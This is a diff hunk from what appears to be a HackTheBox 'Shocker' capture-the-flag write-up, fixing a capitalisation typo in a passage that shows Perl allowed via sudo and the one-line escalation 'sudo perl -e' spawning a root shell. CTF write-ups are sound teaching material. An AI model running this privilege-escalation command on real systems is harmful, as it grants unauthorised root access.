@@ -100,7 +100,7 @@ sudo -l
 ![sudo-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/sudo-09.png)
 
 
-WE can see we are allowed to run Perl. If we can run a scripting language as root, escalation is fairly trivial:
+We can see we are allowed to run Perl. If we can run a scripting language as root, escalation is fairly trivial:
 
 ```perl
 sudo perl -e 'exec "/bin/sh";'
